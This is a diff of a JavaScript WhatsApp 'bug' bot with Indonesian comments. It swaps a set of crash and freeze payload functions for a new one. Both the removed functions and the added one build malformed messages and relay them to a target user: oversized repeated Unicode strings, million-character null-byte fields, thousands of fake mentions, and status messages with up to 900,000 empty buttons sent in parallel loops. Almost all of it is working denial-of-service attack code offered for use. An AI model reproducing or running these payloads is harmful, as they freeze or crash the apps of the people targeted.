@@ -2229,9 +2229,9 @@ if (remainingTime > 0) {
     }
 
     // Eksekusi bug setelah progres selesai
-    for (let i = 0; i <= 50; i++) {   
-   await DelayInvisBapakLowh(sock, target);
-   const delay = ms => new Promise(res => setTimeout(1500));
+    for (let i = 0; i <= 12; i++) {   
+   await delayhardinvisible(sock, target);
+   const delay = ms => new Promise(res => setTimeout(40000));
 }
     console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
     
@@ -2258,368 +2258,39 @@ if (remainingTime > 0) {
 });
 
 // /TEMPAT FUNC DISINI ///
-async function JawaTimurBlankOld(sock, target) {
-  await sock.relayMessage(target, {
-    "videoMessage": {
-      "url": "https://mmg.whatsapp.net/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&mms3=true",
-      "mimetype": "video/mp4",
-      "fileSha256": "Vbqeh2lor8Jw03cFXxKlG0Z8ov9a8WOEkviuZSVSn6A=",
-      "fileLength": "175891",
-      "seconds": 1,
-      "mediaKey": "W430WGQWHdPJavPx++FhjoimbRmgn4juKdt9R6yBKOM=",
-      "height": 848,
-      "width": 480,
-      "fileEncSha256": "9QJErKyUw6Um/LC9shgLoZmN0UDoX8DJPob/G0oXi48=",
-      "directPath": "/v/t62.7161-24/30566750_1857105954891876_3816939022397797459_n.enc?ccb=11-4&oh=01_Q5Aa3QGVqUxB57u6_E2roaz94BnhKVu1X2gLsihMwET-vUIkLQ&oe=6960787D&_nc_sid=5e03e0&_nc_hot=1765345956",
-      "mediaKeyTimestamp": "1765345955",
-      "streamingSidecar": "As5LhkSwskInV2ZBolPQK8kUK/FS8OjeKC4E/DSY",
-      "annotations": [{
-        "shouldSkipConfirmation": true,
-        "embeddedContent": {
-          "embeddedMusic": {
-            "musicContentMediaId": "3312808138872179",
-            "songId": "270259430421407",
-            "author": "ြ".repeat(200000),
+async function delayhardinvisible(sock, target) {
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-            "title": " # 🚯 FaiqOffc Freeze ",
-            "artworkDirectPath": "/v/t62.76458-24/595759391_863062182901487_831028644482797415_n.enc?ccb=11-4&oh=01_Q5Aa3QFi_Lrr3pnfhgCNgS6DwjBC9W1jxZqyMu9YTA3qbjUHrg&oe=69606F3E&_nc_sid=5e03e0",
-            "artworkSha256": "Rm0L8d3YCRSi2JNPUdFEM3n1eABvF1mdvE0DWnPSzyQ=",
-            "artworkEncSha256": "Q6uE0wu/wQ4goKG+OHQkTvSJ2dcSzALDzZ322g9xdfQ=",
-            "artistAttribution": "https://www.instagram.com/_u/carlos_10474",
-            "countryBlocklist": "",
-            "isExplicit": true,
-            "artworkMediaKey": "1hxqLYZLT2dZnJayfE4KP/9wh+kSbBVBkvvguo+N8m8=",
-            "musicSongStartTimeInMs": "10149",
-            "derivedContentStartTimeInMs": "0",
-            "overlapDurationInMs": "1000"
-          }
-        },
-        "embeddedAction": true
-      }]
-    }
-  }, {
-    ephemeralExpiration: 0,
-    forwardingScore: 9741,
-    isForwarded: true,
-    font: Math.floor(Math.random() * 99999999),
-    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999")
-  });
-}
-
-async function BlankXDelay(sock, target) {
-    const pld = "𝐋𝐊𝐁𝐍𝐨??𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫";
-    const x = "‌".repeat(99999) + "ꦾ".repeat(888888) + "ꦽ".repeat(60000);
-    const y = "ꦾꦽ".repeat(999999);
-
-    try {
-        const m = {
-            orderMessage: {
-                orderId: "Okep Hot" + Math.floor(Math.random() * 1000000),
-                thumbnail: Buffer.alloc(1),
-                itemCount: 2147483647,
-                status: 1,
-                surface: 1,
-                message: pld + "\n" + x,
-                orderTitle: pld,
-                sellerJid: "0@s.whatsapp.net",
-                token: "lkb" + "ꦽꦾ".repeat(700000)
-            },
-            listMessage: {
-                title: pld,
-                description: y,
-                buttonText: pld,
-                listType: 1,
-                sections: [
-                    {
-                        title: pld,
-                        rows: Array(30).fill({
-                            title: pld,
-                            rowId: "LKB999",
-                            description: "‌".repeat(99999)
-                        })
-                    }
-                ],
-                contextInfo: {
-                    stanzaId: sock.generateMessageTag(),
-                    participant: target,
-                    quotedMessage: {
-                        conversation: x
-                    },
-                    mentionedJid: [target, target, target],
-                    isForwarded: true,
-                    forwardingScore: 999999
-                }
-            }
-        };
-
-        await sock.relayMessage(target, m, {
-            participant: { jid: target },
-            additionalAttributes: {
-                category: "pler",
-                push_priority: "crazy"
-            }
-        });
-
-    } catch (e) {}
-}
-
-async function delayspam(sock, target) {
-    const type = ["galaxy_message", "call_permission_request", "address_message", "payment_method", "mpm"];
-    
-    for (const x of type) {
-        const enty = Math.floor(Math.random() * type.length);
-        const msg = generateWAMessageFromContent(
-            target,
-            {
-                viewOnceMessage: {
-                    message: {
-                        interactiveResponseMessage: {
-                            body: {
-                                text: "\u0003",
-                                format: "DEFAULT"
-                            },
-                            nativeFlowResponseMessage: {
-                                name: x,
-                                paramsJson: "\x10".repeat(1000000),
-                                version: 3
-                            },
-                            entryPointConversionSource: type[enty]
-                        }
-                    }
-                }
-            },
-            {
-                participant: { jid: target }
-            }
-        );
-        
-        await sock.relayMessage(
-            target,
-            {
-                groupStatusMessageV2: {
-                    message: msg.message
-                }
-            },
-            {
-                messageId: msg.key.id,
-                participant: { jid: target }
-            }
-        );
-        
-        await new Promise(resolve => setTimeout(resolve, 1000));
-    }
-}
-
-async function DelayInvisBapakLowh(sock, target) {
-  while (true) {
-    try {   
-      const VnfMsg = {
-        groupStatusMessageV2: {
-          message: {
-            interactiveResponseMessage: {                     
-              body: {
-                text: ".../",
-                format: "DEFAULT"
-              },
-              nativeFlowResponseMessage: {
-                name: "cta_Vnf",
-                paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
-                version: 3
-              }
-            }
-          }
-        }
-      };
-
-      await sock.relayMessage(target, VnfMsg, { 
-        participant: { jid: target } 
-      });
-      
-      console.log(`Delay Hard successfully spammed to ${target}`);
-
-      await new Promise(resolve => setTimeout(resolve, 1500));
-
-    } catch (e) {
-      console.log("❌ Error Strike:", e);
-      await new Promise(resolve => setTimeout(resolve, 5000));
-    }
-  }
-}
-
-async function CrashJnvible(sock, target) {
-  try {
-    const message = {
-      audioMessage: {
-        url: crypto.randomBytes(30000).toString("hex"),
-        mimetype: "audio/ogg; codecs=opus",
-        fileSha256: "A".repeat(10000),
-        fileLength: "123456",
-        seconds: 9999999999,
-        ptt: false
-      },
-      contextInfo: {
-        participant: target,
-        mentionedJid: [
-            "0@s.whatsapp.net",
-            ...Array.from({ length: 2000 }, () =>
-                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
-            )
-        ],
-        remoteJid: "X",
-        participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-        stanzaId: "123",
-        quotedMessage: {
-          paymentInviteMessage: {
-              serviceType: 3,
-              expiryTimestamp: Date.now() + 1814400000
-          },
-          forwardedAiBotMessageInfo: {
-              botName: "META AI",
-              botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
-              creatorName: "Bot"
-          }
+    const makeMsg = (count) => ({
+        groupStatusMessageV2: {
+            message: {
+                interactiveMessage: {
+                    body: { text: "PhantomX" },
+                    nativeFlowMessage: {
+                        buttons: Array.from({ length: count }, () => ({}))
+                    }
+                }
+            }
         }
-      }
-    };
-
-    await sock.relayMessage(target, message, {
-      messageId: null
     });
-    
-  } catch (err) {
-    console.error("Error:", err)
-  }
-}
 
-async function CrashUi(sock, target) {
-    await sock.relayMessage(target, {
-       viewOnceMessage: {
-          message: {
-         groupInviteMessage: {
-              groupJid: "1@g.us",
-              inviteCode: "ꦽ".repeat(5000),
-              inviteExpiration: "99999999999",
-              groupName: "༑ ▾ try anjg ▾ ༑" + "ꦾ".repeat(250000),
-              caption: " x " + "ꦾ".repeat(5000),
-              body: { text: "\u200B" + "ោ៝".repeat(25000) }
-             }
-           }
-         }
-        }, { participant: { jid: target } });
-    }
-
-async function JawaTimurIsBack(sock, target) {
-  try {
-    const msg = {
-      viewOnceMessage: {
-        message: {
-          locationMessage: {
-            degreesLongitude: 0,
-            degreesLatitude: 0,
-            name: "./K茅帽贸帽f脿莽t贸r." + "軎�".repeat(10000), 
-            url: "https://files.catbox.moe/6yrcjm" +  "釤勧煗".repeat(15000) + ".mp4", 
-            address: "../K茅帽贸帽f脿莽t贸r." + "軎�".repeat(20000),
-            contextInfo: {
-              externalAdReply: {
-                renderLargerThumbnail: true, 
-                showAdAttribution: true, 
-                body: " Function Khas Jawa", 
-                title: "喑勦線".repeat(10000), 
-                sourceUrl: "https://t.me/" +  "嗉�".repeat(10000),  
-                thumbnailUrl: null,
-              }
-            }
-          },
-
-          documentMessage: {
-              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-              fileLength: "9999999999999",
-              pageCount: 1316134911,
-              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-              fileName: "./ex3s.pdf" + "饝湨饝湢".repeat(25000),
-              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-              mediaKeyTimestamp: "1726867151",
-              contactVcard: false,
-              jpegThumbnail: null,
-          },
+    const loop = async (payload) => {
+        for (let i = 0; i < 30; i++) {
+            // Tambahkan noSelfSync di dalam kurung kurawal opsi parameter ketiga
+            await sock.relayMessage(target, payload, { noSelfSync: true }); 
+            await sleep(5000);
         }
-      }
     };
 
-    await sock.relayMessage(target, msg, {})
-
-  } catch (err) {
-    console.error("Error lol:", err);
-  }
+    await Promise.all([
+        loop(makeMsg(100000)),
+        loop(makeMsg(100000)),
+        loop(makeMsg(100000)),
+        loop(makeMsg(900000)),
+    ]);
 }
 
-async function JawaTimurForcloseRelog(sock, target) {
-       const options = [
-        { optionName: "1msg" },
-        { optionName: "execute" }
-    ];
-    const correctAnswer = options[1];
-    const msg = generateWAMessageFromContent(
-        target,
-        {
-            viewOnceMessage: {
-                message: {
-                    interactiveResponseMessage: {
-                        body: {
-                            text: "- ",
-                            format: "EXTENSION_1"
-                        },
-                        nativeFlowResponseMessage: {
-                            name: "galaxy_message",
-                            paramsJson: "\u0000".repeat(1_000_000),
-                            version: 3
-                        },
-                        contextInfo: {
-                            remoteJid: "Staff Function Khas Jawa",
-                            participant: "13135550202@s.whatsapp.net",
-                            fromMe: false,
-                            expiration: 7205,
-                            ephemeralSettingTimestamp: 2502,
-                            disappearingMode: {
-                                initiator: "INITIATED_BY_OTHER",
-                                trigger: "ACCOUNT_SETTING"
-                            },
-                            requestPaymentMessage: {
-                                currencyCodeIso4217: "USD",
-                                requestFrom: target,
-                                expiryTimestamp: null
-                            }
-                        }
-                    }
-                }
-            },
-            botInvokeMessage: {
-                message: {
-                    messageContextInfo: {
-                        messageSecret: crypto.randomBytes(32),
-                        messageAssociation: {
-                            associationType: 7,
-                            parentMessageKey: crypto.randomBytes(16)
-                        }
-                    },
-                    pollCreationMessage: {
-                        name: "Null᭾",
-                        options: options,
-                        selectableOptionsCount: 1,
-                        pollType: "QUIZ",
-                        correctAnswer: correctAnswer
-                    }
-                }
-            }
-        },
-        {}
-    );
 
-    await sock.relayMessage(target, msg.message, { messageId: msg.key.id });
-}
 
 
 /// END FUNCTION LU DISINI ///
